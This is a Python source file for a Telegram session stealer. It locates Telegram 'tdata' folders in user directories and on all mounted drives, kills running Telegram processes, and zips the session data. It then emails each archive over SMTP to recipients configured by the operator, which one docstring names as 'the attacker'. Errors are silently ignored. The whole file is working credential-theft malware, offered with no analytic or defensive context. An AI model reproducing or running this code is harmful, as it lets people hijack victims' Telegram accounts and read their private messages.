import time
import os
import psutil
import shutil
import smtplib
import tempfile
import subprocess
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


class TelegramHarvester:
    def __init__(self, sender_email: str, sender_passwd: str, server: str = "smtp.gmail.com", port: int = 587, receivers: list[str] = None):
        # move current location to temp directory
        self.temp_path = tempfile.gettempdir()
        os.chdir(self.temp_path)

        # create list to save tdata paths found
        self.tdata_paths = []

        # email configurations
        self.sender_email = sender_email
        self.sender_passwd = sender_passwd
        self.server = server
        self.port = port
        self.receivers = receivers

    def find_tdata_in(self, path):
        '''
        description: find tdata in specific location
        '''
        tdata_path = None
        for root, dirs, files in os.walk(path):
            for dir in dirs:
                if 'telegram' in dir.lower():
                    telegram_path = os.path.join(root, dir)

                    tdata_path = os.path.join(telegram_path, 'tdata')
                    if os.path.isdir(tdata_path) and tdata_path not in self.tdata_paths:
                        self.tdata_paths.append(tdata_path)

    def terminate_td(self):
        '''
        description: kills Telegram processes if running
        '''
        if os.name == 'nt':
            import wmi
            f = wmi.WMI()
            for process in f.Win32_Process():
                if 'telegram' in process.name.lower():
                    process.Terminate()
        else:
            processes = subprocess.Popen(
                'ps -A', shell=True, stdout=subprocess.PIPE)
            output, error = processes.communicate()

            for line in output.splitlines():
                if 'telegram' in str(line).lower():
                    pid = int(line.split(None, 1)[0])
                    os.kill(pid, 9)

    def send_zip(self, zip_path):
        '''
        description: report tdata zip to the attacker
        '''
        try:
            DESTINATION_ARCHIVE_NAME = zip_path
            SUBJECT = "Telegram Data {}".format(zip_path)

            # separate emails using comma
            RECIPIENTS = ','.join(self.receivers)

            msg = MIMEMultipart()
            msg['Subject'] = SUBJECT
            msg['From'] = self.sender_email
            msg['To'] = RECIPIENTS

            part = MIMEBase("application", "octet-stream")
            part.set_payload(open(DESTINATION_ARCHIVE_NAME, "rb").read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition",
                            "attachment; filename=\"%s\"" % (DESTINATION_ARCHIVE_NAME))
            msg.attach(part)

            smtp = smtplib.SMTP(self.server, self.port)
            smtp.ehlo()
            smtp.starttls()
            smtp.ehlo()
            smtp.login(self.sender_email, self.sender_passwd)
            smtp.sendmail(self.sender_email, RECIPIENTS, msg.as_string())
            smtp.close()

            return True

        except Exception as e:
            # ignore any exceptions occurred
            return False

    def create_archive_and_send_mail(self, source_path: str, dest_path: str):
        '''
        desciption: creates archive and send email 
        '''
        os.chdir(dest_path)
        self.terminate_td()
        zip_name = 'tdata_zip_file_{}'.format(time.time())
        shutil.make_archive(zip_name, 'zip', dest_path, source_path)
        zip_path = os.path.join(dest_path, zip_name + '.zip')
        self.send_zip(zip_path)
        os.chdir(dest_path)
        os.remove(zip_path)

    def search_in_paritions(self,):
        '''
        description: search for telegram data in mounted partitions
        '''
        partitions = psutil.disk_partitions()
        for partition in partitions:
            self.find_tdata_in(partition.mountpoint)

    def start(self):
        # target os specific locations to search for tdata
        if os.name == 'nt':
            probable_installation_paths = [
                os.environ['APPDATA'],
                os.environ['ALLUSERSPROFILE'],
                os.environ['LOCALAPPDATA'],
                os.environ['PROGRAMW6432'],
                os.environ['PROGRAMFILES(X86)'],
            ]

        else:
            probable_installation_paths = [
                os.environ['HOME'],
            ]

        # first search in probable installation locations
        for path in probable_installation_paths:
            self.find_tdata_in(path)

        self.terminate_td()
        self.search_in_paritions()
        for tpath in self.tdata_paths:
            self.create_archive_and_send_mail(
                source_path=tpath, dest_path=self.temp_path)
